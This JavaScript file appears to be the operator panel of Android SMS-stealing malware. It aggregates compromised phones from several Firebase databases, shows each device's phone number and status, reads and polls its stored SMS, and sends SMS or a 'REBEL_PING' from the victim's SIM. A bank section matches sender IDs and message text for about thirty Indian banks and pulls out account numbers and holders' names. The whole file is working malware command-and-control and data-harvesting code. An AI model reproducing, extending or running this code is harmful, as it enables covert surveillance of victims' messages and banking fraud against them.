function isFirebaseErr(d){return !!(d&&typeof d==='object'&&d.error&&Object.keys(d).length<=2);}

function loadFirebaseConfigs(){
  var p=(SERVER_FIREBASES||[]).slice();
  DEFAULT_FIREBASES.forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
  return p;
}
function reloadServerFirebase(){
  return fetch(FIREBASE_API_URL,{cache:'no-store',credentials:'same-origin'}).then(function(r){return r.json();}).then(function(d){
    if(d&&d.ok){SERVER_FIREBASES=d.projects||[];return SERVER_FIREBASES;}
    return [];
  }).catch(function(){return [];});
}
function getFbAuthKey(inst){
  if(!inst||!inst.config)return '';
  var c=inst.config;
  return c.secret||c.authKey||c.key||c.databaseSecret||'';
}
function restUrlForInst(inst,path){
  var url=inst.restUrl+'/'+path.replace(/^\//,'');
  if(!/\.json(\?|$)/.test(url))url+='.json';
  var key=getFbAuthKey(inst);
  if(key)url+=(url.indexOf('?')>=0?'&':'?')+'auth='+encodeURIComponent(key);
  return url;
}
function restJsonInst(inst,path){
  return restJson(restUrlForInst(inst,path));
}
function initFirebaseInstance(cfg){
  var appName='mfb_'+cfg.id,db=null;
  if(cfg.apiKey){
    try{
      var exists=false;firebase.apps.forEach(function(a){if(a.name===appName)exists=true;});
      if(!exists)firebase.initializeApp({apiKey:cfg.apiKey,authDomain:cfg.authDomain||'',databaseURL:cfg.databaseURL,projectId:cfg.projectId||cfg.id,storageBucket:cfg.storageBucket||'',messagingSenderId:cfg.messagingSenderId||'',appId:cfg.appId||''},appName);
      db=firebase.app(appName).database();
    }catch(e){}
  }
  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(cfg.databaseURL.indexOf('rabel-raand')>=0?'rabel':'spinplay'),liveAttached:false};
  firebaseInstances.push(inst);return inst;
}
function initFirebase(){
  firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
  firebaseConfigs.forEach(initFirebaseInstance);
  updateFbUi();
}
function addFirebaseProject(){
  var name=document.getElementById('fbAddName').value.trim();
  var url=document.getElementById('fbAddUrl').value.trim().replace(/\/$/,'');
  var secret=document.getElementById('fbAddSecret').value.trim();
  var apiKey=document.getElementById('fbAddApiKey').value.trim();
  if(!name||!url){toast('Project name aur Firebase URL zaroori hai',false);return;}
  if(firebaseConfigs.some(function(c){return (c.databaseURL||'').replace(/\/$/,'')===url;})){
    toast('Yeh Firebase URL pehle se added hai',false);return;
  }
  var id='fb_'+Date.now();
  var cfg={
    id:id,
    name:name,
    databaseURL:url,
    secret:secret,
    key:secret,
    apiKey:apiKey,
    schema:url.indexOf('rabel')>=0?'rabel':'spinplay'
  };
  adminApiPost({action:'add',name:name,databaseURL:url,secret:secret,apiKey:apiKey,id:id,schema:cfg.schema}).then(function(res){
    if(!res||!res.ok){toast((res&&res.error)||'Add failed',false);return;}
    reloadServerFirebase().then(function(){
      firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
      firebaseConfigs.forEach(initFirebaseInstance);
      firebaseInstances.forEach(function(inst){attachLive(inst);});
      Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
        processClientsData();
        updateFbUi();
        toast('Added: '+name+' — mobile sync ON',true);
      });
    });
  }).catch(function(){toast('Network error',false);});
  document.getElementById('fbAddName').value='';
  document.getElementById('fbAddUrl').value='';
  document.getElementById('fbAddSecret').value='';
  document.getElementById('fbAddApiKey').value='';
  closeFbSheet();
}
function removeFirebaseProject(id){
  if(firebaseConfigs.length<=1){toast('Kam se kam 1 Firebase chahiye',false);return;}
  adminApiPost({action:'delete',id:id}).then(function(res){
    if(!res||!res.ok){toast((res&&res.error)||'Delete failed',false);return;}
    reloadServerFirebase().then(function(){
      Object.keys(clientsRawMap).forEach(function(k){
        if(k.indexOf(id+'::')===0)delete clientsRawMap[k];
      });
      if(selDev&&selDev.indexOf(id+'::')===0){selDev='';clearListeners();}
      firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
      firebaseConfigs.forEach(initFirebaseInstance);
      firebaseInstances.forEach(function(inst){attachLive(inst);});
      Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
        processClientsData();
        updateFbUi();
        toast('Project removed',true);
      });
    });
  }).catch(function(){toast('Network error',false);});
}
initFirebase();

function updateFbUi(){
  var total=allDevs.length;
  var proj=firebaseConfigs.length;
  document.getElementById('fbChip').textContent=proj+' FB · '+total+' dev ▾';
  document.getElementById('moreFbName').textContent=proj+' projects';
  document.getElementById('hdrSub').textContent=total+' devices · '+proj+' Firebase combined';
  var html=firebaseConfigs.map(function(c){
    var cnt=allDevs.filter(function(d){return d.fbId===c.id;}).length;
    return '<div class="fb-option"><div><div>'+esc(c.name)+'</div><div class="cnt">'+cnt+' devices · '+esc((c.databaseURL||'').replace(/^https?:\/\//,'').split('/')[0])+'</div></div>'+
      (proj>1?'<button type="button" onclick="event.stopPropagation();removeFirebaseProject(\''+c.id+'\')" style="background:none;border:1px solid var(--border);color:var(--error);border-radius:8px;padding:6px 10px;font-size:10px;cursor:pointer">✕</button>':'')+
      '</div>';
  }).join('');
  document.getElementById('fbSheetList').innerHTML=html||'<div class="empty-state" style="padding:20px"><div class="ico">🔥</div>No Firebase yet — add below</div>';
}
function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}

function getPhoneFromRecord(s){
  if(!s)return'';
  var check=function(obj){if(!obj)return null;var keys=['mobNo','phone','phone_number','number','mobile','phone_no','cell','contact_no','mobile_no'];for(var i=0;i<keys.length;i++){if(obj[keys[i]]&&typeof obj[keys[i]]==='string'&&obj[keys[i]].trim()!=='')return String(obj[keys[i]]).trim();}return null;};
  var p=check(s);if(p)return p;
  if(s.device_info){p=check(s.device_info);if(p)return p;}
  if(s.live_data){p=check(s.live_data);if(p)return p;}
  if(s.sims&&Array.isArray(s.sims)){for(var i=0;i<s.sims.length;i++){var sim=s.sims[i];var pn=sim.phoneNumber||sim.number||sim.phone||sim.mobNo||sim.mobile||sim.contact_no;if(pn)return String(pn).trim();}}
  if(s.sim_info&&typeof s.sim_info==='object'){var si=s.sim_info;p=check(si);if(p)return p;if(si.sims&&Array.isArray(si.sims)){for(var i=0;i<si.sims.length;i++){var sim=si.sims[i];var pn=sim.phoneNumber||sim.number||sim.phone||sim.mobNo||sim.mobile||sim.contact_no;if(pn)return String(pn).trim();}}}
  return '';
}
function normalizeClientRecord(raw){
  if(!raw||typeof raw!=='object')return null;
  if(raw.password||raw.Pass)return null;
  var on=resolveOnlineStatus(raw,raw._fbId||'');
  if(raw.modelName||raw.deviceId||raw.mobNo)return{
    name:raw.modelName||'Unknown',brand:raw.brand||'',android:raw.androidV||'',
    online:on,battery:parseInt(raw.battery,10)||0,
    network:raw.service_provider||'?',sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)
  };
  return{name:raw.name||raw.device_model||'Unknown',brand:raw.brand||'',android:raw.android||'',
    online_status:raw.online_status,online:raw.online,status:raw.status,
    online:on,battery:parseInt(raw.battery||raw.battery_level,10)||0,network:raw.network||'?',
    sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)};
}
function ingestDeviceData(fbId,node,devId,data){
  var norm=normalizeClientRecord(Object.assign({_fbId:fbId},data));if(!norm)return;
  norm._node=node;norm._fbId=fbId;
  clientsRawMap[makeDevKey(fbId,devId)]=Object.assign({},clientsRawMap[makeDevKey(fbId,devId)]||{},norm);
}
function mergeSummaryNode(fbId,node,raw){
  if(!raw||typeof raw!=='object')return;
  Object.keys(raw).forEach(function(k){if(raw[k]&&typeof raw[k]==='object')ingestDeviceData(fbId,node,k,raw[k]);});
}
function processClientsData(){
  allDevs=[];
  Object.keys(clientsRawMap).forEach(function(k){
    var s=clientsRawMap[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
    var on=resolveOnlineStatus(s,p.fbId);
    allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'clients',
      name:s.name||'Unknown',displayPhone:getPhoneFromRecord(s)||'No Number',brand:s.brand||'',android:s.android||'',
      status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0,
      sims:extractDeviceSims(s)});
  });
  allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:0;});
  if(!selDev&&allDevs.length)selDev=allDevs[0].id;
  renderDevices();updateStats();updateFbUi();
}
function updateStats(){
  var l=getFilteredDevs();
  document.getElementById('stTotal').textContent=l.length;
  document.getElementById('stOnline').textContent=l.filter(function(d){return d.status==='online';}).length;
  document.getElementById('stOffline').textContent=l.filter(function(d){return d.status==='offline';}).length;
}
function fetchSummaryNode(inst,node){
  return restJsonInst(inst,node).then(function(raw){mergeSummaryNode(inst.id,node,raw);processClientsData();});
}
function discoverInstance(inst){
  var key=getFbAuthKey(inst);
  var shallow=inst.restUrl+'/.json?shallow=true'+(key?'&auth='+encodeURIComponent(key):'');
  return restJson(shallow).then(function(roots){
    if(!roots||typeof roots!=='object'||isFirebaseErr(roots))return;
    if(roots.messages)inst.schema='rabel';
    else if(roots.devices&&!roots.clients)inst.schema='spinplay';
    else if(roots.clients)inst.schema='rabel';
    var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
    var tasks=[];
    nodes.forEach(function(n){
      if(SUMMARY_NODES.indexOf(n)>=0||n==='clients'||n==='devices')tasks.push(fetchSummaryNode(inst,n));
    });
    return Promise.all(tasks);
  });
}
function attachLive(inst){
  if(!inst.db||inst.liveAttached)return;inst.liveAttached=true;
  ['clients','devices_status','devices'].forEach(function(node){
    try{
      inst.db.ref(node).on('value',function(s){
        if(!s.exists())return;
        mergeSummaryNode(inst.id,node,s.val());processClientsData();
      });
    }catch(e){}
  });
}
function fetchAllData(){
  document.getElementById('hdrSub').textContent='Syncing all Firebase...';
  firebaseInstances.forEach(attachLive);
  return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
    processClientsData();
    document.getElementById('hdrSub').textContent=allDevs.length+' devices · '+firebaseConfigs.length+' Firebase combined';
    if(selDev)loadSmsForDevice();
  });
}
function refreshData(){toast('Refreshing...',true);fetchAllData();}

function renderDevices(){
  var q=(document.getElementById('devSearch').value||'').toLowerCase();
  var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.rawId).toLowerCase().includes(q);});
  var el=document.getElementById('devList');
  if(!list.length){el.innerHTML='<div class="empty-state"><div class="ico">📡</div>No devices yet<br><span style="font-size:11px;opacity:.6">Pull refresh or wait for sync</span></div>';return;}
  el.innerHTML=list.map(function(d){
    return '<div class="dev-card '+d.status+(d.id===selDev?' active':'')+'" onclick="selectDevice(\''+d.id+'\')">'+
      '<div class="dev-bar"></div><div class="dev-body">'+
      '<div class="dev-phone">'+esc(d.displayPhone)+'</div>'+
      '<div class="dev-meta">'+esc(d.name)+' · <span class="chip fb">'+esc(d.fbName)+'</span></div>'+
      '<div class="dev-chips"><span class="chip bat">'+d.battery+'%</span><span class="chip">'+esc(d.network)+'</span><span class="chip">'+d.smsCount+' SMS</span></div>'+
      '</div></div>';
  }).join('');
}
function selectDevice(id){
  selDev=id;renderDevices();renderDeviceView();updateSendForm();loadSmsForDevice();renderBankAccounts();
  switchTab('device',document.querySelector('.nav-item[data-tab="device"]'));
}

function renderDeviceView(){
  var d=getSelDev(),empty=document.getElementById('deviceEmpty'),hero=document.getElementById('deviceHero');
  if(!d){empty.classList.remove('hidden');hero.classList.add('hidden');return;}
  empty.classList.add('hidden');hero.classList.remove('hidden');
  hero.innerHTML='<div class="hero-card">'+
    '<div class="hero-phone">'+esc(d.displayPhone)+'</div>'+
    '<div class="hero-model">'+esc(d.name)+(d.brand?' · '+esc(d.brand):'')+' · <span class="chip fb">'+esc(d.fbName)+'</span></div>'+
    '<div class="hero-badge '+d.status+'">'+(d.status==='online'?'● ONLINE':'○ OFFLINE')+'</div>'+
    '<div class="hero-grid">'+
    '<div class="hero-cell"><div class="hero-lbl">BATTERY</div><div class="hero-val">'+d.battery+'%</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">NETWORK</div><div class="hero-val">'+esc(d.network)+'</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">ANDROID</div><div class="hero-val">'+esc(d.android||'?')+'</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">SMS</div><div class="hero-val">'+d.smsCount+'</div></div>'+
    '</div><div style="margin-top:12px;font-size:9px;color:var(--muted);font-family:\'Space Mono\',monospace">'+esc(d.rawId)+'</div></div>';
}
function extractDeviceSims(raw){
  var sims=[],seen={},i,s,pn;
  if(!raw||typeof raw!=='object')return sims;
  var list=raw.sims;
  if(list&&typeof list==='object'&&!Array.isArray(list))list=Object.keys(list).map(function(k){return list[k];});
  if(Array.isArray(list)){
    for(i=0;i<list.length;i++){
      s=list[i];
      if(typeof s==='string'&&s&&!seen[s]){seen[s]=1;sims.push({slot:i+1,phoneNumber:s});continue;}
      if(!s||typeof s!=='object')continue;
      pn=s.phoneNumber||s.number||s.phone||s.mobNo||s.mobile||'Unknown';
      if(!seen[pn]){seen[pn]=1;sims.push({slot:i+1,phoneNumber:pn});}
    }
  }
  if(!sims.length){
    pn=getPhoneFromRecord(raw);
    if(pn)sims.push({slot:1,phoneNumber:pn});
  }
  return sims;
}
function renderSimSelector(d){
  var el=document.getElementById('simSelector');
  if(!el)return;
  var sims=(d&&d.sims&&d.sims.length)?d.sims:[{slot:1,phoneNumber:'SIM 1'},{slot:2,phoneNumber:'SIM 2'}];
  _sendSimSlot=sims[0].slot||1;
  el.innerHTML=sims.map(function(s,idx){
    var slot=s.slot||idx+1;
    var label='SIM '+slot+(s.phoneNumber&&s.phoneNumber!=='Unknown'?' · '+s.phoneNumber:'');
    return '<div class="sim-chip'+(slot===_sendSimSlot?' active':'')+'" data-sim="'+slot+'" onclick="selectSim('+slot+',this)">'+esc(label)+'</div>';
  }).join('');
}
function updateSendForm(){
  var d=getSelDev();
  document.getElementById('sendEmpty').classList.toggle('hidden',!!d);
  document.getElementById('sendForm').classList.toggle('hidden',!d);
  if(d)renderSimSelector(d);
}

function clearListeners(){
  Object.keys(activeListeners).forEach(function(k){
    var L=activeListeners[k];
    if(L.timer)clearInterval(L.timer);
    if(L.timers){L.timers.forEach(function(t){clearInterval(t);});}
    if(L.refs){L.refs.forEach(function(r){try{if(r.ref&&r.h){r.ref.off('value',r.h);}}catch(e){}});}
    else if(L.db&&L.ref&&L.h){try{L.ref.off('value',L.h);}catch(e){}}
  });
  activeListeners={};
}

/** All known SMS paths — rebel.py uses messages/{id}; SpinPlay uses devices/.../all_sms */
function smsPathsForDevice(d){
  var id=d.rawId, node=d.deviceNode||'clients', paths=[], bases=[node,'clients','devices'];
  paths.push('messages/'+id);
  bases.forEach(function(n){
    if(!n||!id)return;
    paths.push(n+'/'+id+'/all_sms');
    paths.push(n+'/'+id+'/new_sms');
    paths.push(n+'/'+id+'/sms');
    paths.push(n+'/'+id+'/messages');
  });
  var out=[], seen={};
  paths.forEach(function(p){if(p&&!seen[p]){seen[p]=1;out.push(p);}});
  return out;
}

function mergeSmsLists(){
  var merged=[], seen={}, i, j, list, s, key;
  for(i=0;i<arguments.length;i++){
    list=arguments[i]||[];
    for(j=0;j<list.length;j++){
      s=list[j];if(!s)continue;
      key=(s.address||'?')+'|'+(s.ts||0)+'|'+(s.body||'').slice(0,80);
      if(seen[key])continue;
      seen[key]=1;merged.push(s);
    }
  }
  merged.sort(function(a,b){return (b.ts||0)-(a.ts||0);});
  return merged;
}

function fetchSmsFromPaths(inst,d){
  if(!inst||!d)return Promise.resolve([]);
  var paths=smsPathsForDevice(d);
  return Promise.all(paths.map(function(p){
    return restJsonInst(inst,p).then(function(data){
      if(!data||isFirebaseErr(data))return [];
      return smsAsList(data).map(normalizeSms).filter(Boolean);
    }).catch(function(){return[];});
  })).then(function(results){
    var args=[mergeSmsLists];
    results.forEach(function(r){args.push(r);});
    return mergeSmsLists.apply(null,results);
  });
}

function loadSmsForDevice(){
  var d=getSelDev();if(!d)return;
  document.getElementById('smsEmpty').classList.add('hidden');
  clearListeners();
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase project not found',false);return;}

  function applySmsList(list){
    window_allSms=list||[];
    window_sms=window_allSms.slice(0,80);
    renderSms();
    if(document.getElementById('screen-bank').classList.contains('active'))renderBankAccounts();
  }

  function poll(){
    fetchSmsFromPaths(inst,d).then(applySmsList).catch(function(){applySmsList([]);});
  }

  poll();
  var timer=setInterval(poll,3500);
  var listeners={timer:timer,timers:[timer],refs:[]};

  if(inst.db){
    smsPathsForDevice(d).slice(0,4).forEach(function(p){
      try{
        var ref=inst.db.ref(p);
        try{ref=ref.limitToLast(100);}catch(e2){}
        var h=function(){fetchSmsFromPaths(inst,d).then(applySmsList);};
        ref.on('value',h);
        listeners.refs.push({ref:ref,h:h});
      }catch(e){}
    });
  }

  activeListeners[d.id]=listeners;
}
function smsAsList(raw){
  if(!raw)return[];
  if(Array.isArray(raw))return raw.filter(function(x){return x&&typeof x==='object';});
  return Object.keys(raw).map(function(k){return raw[k];}).filter(function(x){return x&&typeof x==='object';});
}
// ---- FIX: SMS timestamp extraction and sorting ----
function smsToMs(v){
  if(v==null||v==='')return 0;
  if(typeof v==='number'&&v>0)return v<1e12?v*1000:v;
  if(typeof v==='string'&&!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}
  if(typeof v==='string'){var t=Date.parse(v);if(!isNaN(t))return t;var d2=parseDdMmYyyy(v);if(d2)return d2;}
  return 0;
}
function parseDdMmYyyy(s){
  if(!s||typeof s!=='string')return 0;
  var m=String(s).trim().match(/^(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})(?:\s*[|\s]\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM|am|pm)?)?$/i);
  if(!m)return 0;
  var dd=+m[1],MM=+m[2],yyyy=+m[3],hh=+(m[4]||0),mi=+(m[5]||0),ss=+(m[6]||0),ap=m[7];
  if(ap){var p=ap.toUpperCase();if(p==='PM'&&hh<12)hh+=12;if(p==='AM'&&hh===12)hh=0;}
  var ms=new Date(yyyy,MM-1,dd,hh,mi,ss).getTime();
  return isNaN(ms)?0:ms;
}
function smsMsgTime(m){
  if(!m)return 0;
  var keys=['date','timestamp','dateTime','datetime','time','received_at','sent_at','created_at','receivedAt','sentAt','sms_time','msg_time','last_modified','received_time','sent_time','id'];
  for(var i=0;i<keys.length;i++){var ms=smsToMs(m[keys[i]]);if(ms)return ms;}
  var sk=smsToMs(m._sortKey);if(sk)return sk;
  return smsToMs(m.date_readable);
}
function normalizeSms(m){
  if(!m||typeof m!=='object')return null;
  var body=String(m.body||m.message||m.text||m.content||m.msg||'').trim();
  if(!body)return null;
  var ts=smsMsgTime(m);
  return{
    address:m.address||m.sender||m.from||m.number||m.originatingAddress||'?',
    body:body,
    date_readable:m.date_readable||m.dateTime||m.date_time||m.time||m.date||'—',
    type:String(m.type||m.direction||m.sms_type||'inbox').toLowerCase(),
    ts:ts
  };
}
function renderSmsFromData(data){
  var list=smsAsList(data).map(normalizeSms).filter(Boolean);
  // Sort by timestamp descending (latest first)
  list.sort(function(a,b){return (b.ts||0)-(a.ts||0);});
  window_sms=list.slice(0,60);renderSms();
}
function renderSms(){
  var d=getSelDev(),el=document.getElementById('smsList');
  if(!d){document.getElementById('smsEmpty').classList.remove('hidden');el.innerHTML='';return;}
  if(!window_sms.length){el.innerHTML='<div class="empty-state"><div class="ico">📭</div>No SMS on this device</div>';return;}
  el.innerHTML=window_sms.map(function(s){
    var out=s.type==='sent'||s.type==='outbox';
    return '<div class="sms-bubble '+(out?'out':'in')+'">'+
      '<div class="sms-from">'+esc(s.address)+(out?'':'')+'</div>'+
      esc(s.body)+'<div class="sms-time">'+esc(s.date_readable)+'</div></div>';
  }).join('');
}

// ---- FIX: SIM Selection ----
var _sendSimSlot=1;
function selectSim(slot,btn){
  _sendSimSlot=slot;
  document.querySelectorAll('.sim-chip').forEach(function(el){el.classList.remove('active');});
  if(btn)btn.classList.add('active');
}

// ---- Send SMS — rebel.py same logic (via PHP proxy + Firebase auth) ----
function normalizePhone(raw){
  var clean=String(raw||'').replace(/\D/g,'');
  if(clean.length===10)return clean;
  if(clean.length>10&&clean.indexOf('91')===0)return clean.slice(-10);
  return clean;
}
function sendSmsFetch(body){
  var hdr={'Content-Type':'application/json'};
  var apk=rebelApkHeaders();
  for(var k in apk)hdr[k]=apk[k];
  return fetch(SEND_SMS_URL,{method:'POST',headers:hdr,body:JSON.stringify(body||{})})
    .then(function(r){return r.json().then(function(j){return{httpOk:r.ok,data:j};});});
}
function sendSms(){
  var d=getSelDev();if(!d){toast('Select a device first',false);return;}
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase not loaded',false);return;}
  var to=normalizePhone(document.getElementById('sendTo').value.trim());
  var msg=document.getElementById('sendMsg').value.trim();
  if(!to||to.length<10){toast('Enter valid 10-digit number',false);return;}
  if(!msg){toast('Enter message',false);return;}
  document.getElementById('sendStatus').textContent='Sending via SIM '+_sendSimSlot+'...';
  sendSmsInternal(to,msg,_sendSimSlot,function(ok,data){
    if(ok){
      document.getElementById('sendStatus').textContent='✅ Sent from SIM '+_sendSimSlot;
      document.getElementById('sendMsg').value='';
      toast('SMS sent to device',true);
    }else{
      document.getElementById('sendStatus').textContent='❌ '+(data&&data.error||'Failed');
      toast(data&&data.error||'Send failed',false);
    }
  });
}

// ---- FIX: Check Recharge (Ping) ----
function checkRecharge(){
  var d=getSelDev();if(!d){toast('Select a device first',false);return;}
  var phone=d.displayPhone;
  if(!phone||phone==='No Number'){toast('Device has no phone number',false);return;}
  document.getElementById('sendStatus').textContent='Pinging...';
  sendSmsInternal(phone, 'REBEL_PING', _sendSimSlot, function(success){
    if(success) toast('Ping sent – device is reachable!',true);
    else toast('Ping failed – device may be offline',false);
  });
}
function sendSmsInternal(to, msg, simSlot, callback){
  var d=getSelDev();if(!d){if(callback)callback(false,{error:'No device'});return;}
  var inst=getFbInstance(d.fbId);
  if(!inst){if(callback)callback(false,{error:'Firebase missing'});return;}
  var phone=normalizePhone(to);
  sendSmsFetch({
    device_id:d.rawId,
    to:phone,
    message:msg,
    sim:simSlot||1,
    database_url:inst.restUrl,
    auth_key:getFbAuthKey(inst),
    schema:inst.schema||'rabel',
    device_node:d.deviceNode||'clients'
  }).then(function(res){
    var ok=!!(res.httpOk&&res.data&&res.data.ok);
    if(callback)callback(ok,res.data||{});
  }).catch(function(){
    if(callback)callback(false,{error:'Network error'});
  });
}

// ─── BANK FUNCTIONS (Copied from laptop.php) ───
var BANK_SENDERS=[
  {keys:['SBIINB','SBIPSG','SBIBNK','ATMSBI','SBIUPI','STATEBNK','SBIECS','SBICRD','SBIMEL'],name:'State Bank of India'},
  {keys:['HDFCBK','HDFCBN','HDFCCC','HDFCLI','HDFCVC'],name:'HDFC Bank'},
  {keys:['ICICIB','ICICIT','ICICBK','ICICIA','ICICIP'],name:'ICICI Bank'},
  {keys:['AXISBK','AXISMR','AXISOL'],name:'Axis Bank'},
  {keys:['KOTAKB','KOTAKM','KOTAKBK'],name:'Kotak Mahindra Bank'},
  {keys:['PNBSMS','PNBANK','PNBMBK'],name:'Punjab National Bank'},
  {keys:['BOBSMS','BOBTXN','BANKBAR'],name:'Bank of Baroda'},
  {keys:['CANBNK','CANARA'],name:'Canara Bank'},
  {keys:['UNIONB','UNIONBK','UBOI'],name:'Union Bank of India'},
  {keys:['IDBIBK','IDBISM'],name:'IDBI Bank'},
  {keys:['YESBNK','YESBKL'],name:'Yes Bank'},
  {keys:['INDUSB','INDUSL'],name:'IndusInd Bank'},
  {keys:['FEDBNK','FEDERAL'],name:'Federal Bank'},
  {keys:['BANDHN','BANDHAN'],name:'Bandhan Bank'},
  {keys:['INDBNK','INDIANB'],name:'Indian Bank'},
  {keys:['IDFCFB','IDFCBK'],name:'IDFC FIRST Bank'},
  {keys:['RBLBNK','RBLCRD'],name:'RBL Bank'},
  {keys:['AUDBNK','AUBANK'],name:'AU Small Finance Bank'},
  {keys:['CENTBK','CENTOB'],name:'Central Bank of India'},
  {keys:['IOBCHN','IOBBNK'],name:'Indian Overseas Bank'},
  {keys:['UCOBNK','UCOBANK'],name:'UCO Bank'},
  {keys:['MAHABK','BANKMAH'],name:'Bank of Maharashtra'},
  {keys:['KARBNK','KBLBNK'],name:'Karnataka Bank'},
  {keys:['SOUTHBNK','SBTBNK'],name:'South Indian Bank'},
  {keys:['CITIBK','CITIBN'],name:'Citibank'},
  {keys:['STANCH','SCBANK'],name:'Standard Chartered'},
  {keys:['PAYZAP','PAYTMP'],name:'Paytm Payments Bank'},
  {keys:['AIRBNK','AIRTLM'],name:'Airtel Payments Bank'},
  {keys:['JANABK','JSFBNK'],name:'Jana Small Finance Bank'},
  {keys:['EQUITAS','EQUTAS'],name:'Equitas Small Finance Bank'},
  {keys:['UJVBNK','UJJIVN'],name:'Ujjivan Small Finance Bank'}
];
var BANK_BODY_PATTERNS=[
  [/state\s*bank\s*of\s*india/i,'State Bank of India'],
  [/\bSBI\b[\s\S]{0,40}(?:a\/c|acct|customer|dear|user)/i,'State Bank of India'],
  [/\bHDFC\s*Bank\b/i,'HDFC Bank'],
  [/dear\s+hdfc\b/i,'HDFC Bank'],
  [/\bICICI\s*Bank\b/i,'ICICI Bank'],
  [/dear\s+icici\b/i,'ICICI Bank'],
  [/\bAxis\s*Bank\b/i,'Axis Bank'],
  [/\bKotak\b[\s\S]{0,20}Bank/i,'Kotak Mahindra Bank'],
  [/\bPNB\b[\s\S]{0,30}(?:a\/c|acct|customer)/i,'Punjab National Bank'],
  [/punjab\s*national\s*bank/i,'Punjab National Bank'],
  [/bank\s*of\s*baroda/i,'Bank of Baroda'],
  [/\bBOB\b[\s\S]{0,30}(?:a\/c|acct)/i,'Bank of Baroda'],
  [/canara\s*bank/i,'Canara Bank'],
  [/union\s*bank\s*of\s*india/i,'Union Bank of India'],
  [/\bidbi\s*bank/i,'IDBI Bank'],
  [/\byes\s*bank\b/i,'Yes Bank'],
  [/indusind\s*bank/i,'IndusInd Bank'],
  [/federal\s*bank/i,'Federal Bank'],
  [/bandhan\s*bank/i,'Bandhan Bank'],
  [/indian\s*bank\b/i,'Indian Bank'],
  [/idfc\s*first\s*bank/i,'IDFC FIRST Bank'],
  [/\brbl\s*bank\b/i,'RBL Bank']
];

function parseInrAmount(s){var n=parseFloat(String(s).replace(/,/g,''));return isNaN(n)||n<0||n>1e12?null:n;}
function normalizeSmsSender(addr){var a=String(addr||'').toUpperCase().trim();a=a.replace(/^(?:VM|VK|VD|AD|JD|TX|BZ|BP|BT|BK|AX|AL|AM|ID|QP|JM|CP|XL|XX|VM-|AD-|JD-)[\s\-]*/i,'');return a.replace(/[^A-Z0-9]/g,'');}
function inferBankFromSender(address){var a=normalizeSmsSender(address);if(!a||a.length<3)return null;var best=null,bestLen=0,i,j,keys;for(i=0;i<BANK_SENDERS.length;i++){keys=BANK_SENDERS[i].keys;for(j=0;j<keys.length;j++){if(a.indexOf(keys[j])>=0&&keys[j].length>bestLen){best=BANK_SENDERS[i].name;bestLen=keys[j].length;}}}return best;}
function inferBankFromBody(body){var b=String(body||''),i;for(i=0;i<BANK_BODY_PATTERNS.length;i++){if(BANK_BODY_PATTERNS[i][0].test(b))return BANK_BODY_PATTERNS[i][1];}if(/\bSBI\b/i.test(b)&&/(?:a\/c|acct|account|credited|debited|bal)/i.test(b)) return 'State Bank of India';if(/\bHDFC\b/i.test(b)) return 'HDFC Bank';if(/\bICICI\b/i.test(b)) return 'ICICI Bank';if(/\bAXIS\b/i.test(b)) return 'Axis Bank';if(/\bPNB\b/i.test(b)) return 'Punjab National Bank';if(/\bBOB\b/i.test(b)&&/(?:a\/c|acct|bank)/i.test(b)) return 'Bank of Baroda';return null;}
function inferBankName(body,address){var fromSender=inferBankFromSender(address);if(fromSender)return fromSender;return inferBankFromBody(body);}
function extractAccountFromSms(body){var b=String(body||''),patterns=[/(?:a\/c|a\/c\.|ac|acct|account)\s*(?:no\.?|number|#)?\s*[:\-]?\s*(?:x{1,}|\*{1,}|X{1,})*(\d{4,18})/i,/(?:a\/c|acct|account)\s*(?:no\.?|number)?[:\s]*(?:x{2,}|\*{2,}|X{2,})*(\d{4})\b/i,/(?:ending|ends)\s*(?:with\s*)?(?:x+|\*+|X+)*(\d{4})\b/i,/(?:x{4,}|\*{4,}|X{4,})(\d{4})\b/,/(?:no\.?\s*)(?:x{2,}|\*{2,}|X{2,})(\d{4})\b/i,/(?:a\/c|acct)\s*(?:no\.?)?[:\s]*(\d{8,18})/i],i,m,best=null;for(i=0;i<patterns.length;i++){m=b.match(patterns[i]);if(m&&m[1]){var digits=String(m[1]).replace(/\D/g,'');if(digits.length>=4){if(!best||digits.length>best.length)best=digits;}}}return best;}
function extractHolderFromSms(body){var m=String(body||'').match(/dear\s+([A-Za-z][A-Za-z\s.'-]{1,40}?),/i);if(m&&m[1])return m[1].trim().replace(/\s+/g,' ');return '';}
